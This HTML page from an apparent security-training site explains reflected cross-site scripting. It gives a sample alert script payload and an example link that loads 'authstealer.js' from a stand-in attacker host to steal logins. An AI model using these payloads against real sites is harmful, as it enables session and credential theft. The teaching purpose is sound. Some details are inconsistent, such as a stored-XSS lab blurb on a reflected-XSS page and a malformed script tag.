<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <title>Securify</title>
</head>
<body>
<!--Navbar-->
<seciton class="navbar">
    <div class="logo">
        <i class="fa-solid fa-shield-cat"></i>
        <h2><a href="../index.php">SECURIFY</a></h2>
    </div>
</seciton>
<!--Main-->
<div class="main">
    <div class="buttons">
        <p><a href="../XSS/index.php">XSS</a></p>
        <div class="vertical-line"></div>
        <p><a href="../ReflectedXSS/index.php">Reflected XSS</a></p>
        <div class="vertical-line"></div>
        <p><a href="../StoredXSS/index.php">Stored XSS</a></p>
    </div>
    <div class="text">
        <h2>What is Reflected XSS?</h2>
        <p>
            Reflected XSS attacks, also known as non-persistent attacks, occur when a malicious script is reflected off of a web application to the victim’s browser.
            The script is activated through a link, which sends a request to a website with a vulnerability that enables execution of malicious scripts. The vulnerability is typically a result of incoming requests not being sufficiently sanitized, which allows for the manipulation of a web application’s functions and the activation of malicious scripts.
            To distribute the malicious link, a perpetrator typically embeds it into an email or third party website (e.g., in a comment section or in social media). The link is embedded inside an anchor text that provokes the user to click on it, which initiates the XSS request to an exploited website, reflecting the attack back to the user.
        </p>
        <h3>Reflected XSS attack example</h3>
        <p>
            While visiting a forum site that requires users to log in to their account, a perpetrator executes this search query <script type=’text/javascript’>alert(‘xss’);</script> causing the following things to occur:
            The query produces an alert box saying: “XSS”.
            The page displays: “<script type=’text/javascript’>alert(‘XSS’);</script > not found.”
            The page’s URL reads http://ecommerce.com?q=<script type=”text/javascript”>alert(‘XSS’); </script>.

            This tells the perpetrator that the website is vulnerable. Next, he creates his own URL, which reads http://forum.com?q=news<\script%20src=”http://hackersite.com/authstealer.js” and embeds it as a link into a seemingly harmless email, which he sends to a group of forum users.
            While the sending address and subject line may appear suspect to some, it does not mean that it won’t be clicked on.
        </p>
        <h2>Apply a Reflected XSS attack</h2>
        <p>
            This lab contains a stored cross-site scripting vulnerability in the comment functionality.
        </p>
    </div>
    <button id="apply-btn"><a href="App/index.php">Apply</a></button>
</div>
<!--Footer-->
<section class="footer">
    <div class="box-container">
        <div class="logo">
            <i class="fa-solid fa-shield-cat"></i>
            <h2><a href="#">SECURIFY</a></h2>
        </div>
        <div class="box">
            <h4>Vulnerabilities</h4>
            <a href="#">Cross-site scripting (XSS)</a>
            <a href="#">Reflected Cross-site scripting (XSS)</a>
            <a href="#">Stored Cross-site scripting (XSS)</a>
        </div>
        <div class="box">
            <h4>Company</h4>
            <a href="#">About</a>
            <a href="#">Contact</a>
            <a href="#">Privacy Notice</a>
        </div>
    </div>
</section>
</body>
</html>
<?php
include '../proxy/request_forward.php';
?>